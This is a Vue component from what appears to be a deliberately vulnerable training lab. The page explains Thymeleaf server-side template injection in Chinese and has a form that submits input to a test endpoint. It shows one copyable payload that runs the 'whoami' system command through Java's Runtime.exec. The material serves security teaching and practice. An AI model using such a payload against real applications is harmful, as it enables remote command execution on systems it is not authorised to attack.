<template>
  <vuln-template
    title="SSTI - Thymeleaf"
    subtitle="Server-Side Template Injection"
    level="高危"
    :icon="FileMarkdownOutlined"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>SSTI (Server-Side Template Injection)</strong> 服务端模板注入是指攻击者在模板中注入恶意代码。
      </a-typography-paragraph>
      <a-typography-paragraph>
        Thymeleaf SSTI的危害：
      </a-typography-paragraph>
      <ul>
        <li>执行任意Java代码</li>
        <li>读取服务器文件</li>
        <li>远程命令执行</li>
        <li>完全控制应用程序</li>
      </ul>
      <a-typography-paragraph>
        Thymeleaf是Spring Boot常用的模板引擎。
      </a-typography-paragraph>
    </template>

    <template #payload>
      <a-typography-paragraph>
        Thymeleaf SSTI payload：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>
        __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::.x
      </a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">执行系统命令</span>
      </a-space>

      <a-alert
        message="避免将用户输入直接拼接到模板中！"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #test-form>
      <a-form :model="formState" @finish="handleSubmit" layout="vertical">
        <a-form-item
          label="输入模板表达式"
          name="content"
          :rules="[{ required: true, message: '请输入内容' }]"
        >
          <a-input
            v-model:value="formState.content"
            size="large"
            placeholder="请输入测试内容"
          />
        </a-form-item>

        <a-form-item>
          <a-space>
            <a-button type="primary" html-type="submit" size="large" :loading="loading">
              <template #icon><play-circle-outlined /></template>
              执行测试
            </a-button>
            <a-button size="large" @click="handleReset">
              <template #icon><redo-outlined /></template>
              重置
            </a-button>
          </a-space>
        </a-form-item>
      </a-form>
    </template>

    <template #result v-if="result">
      <div class="result-content">
        <pre style="margin: 0;">{{ result }}</pre>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { FileMarkdownOutlined, PlayCircleOutlined, RedoOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const formState = reactive({
  content: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/ssti/thymeleaf', {
      params: formState
    })
    result.value = response.data
    message.success('测试完成')
  } catch (error) {
    message.error('测试失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.content = ''
  result.value = ''
}
</script>
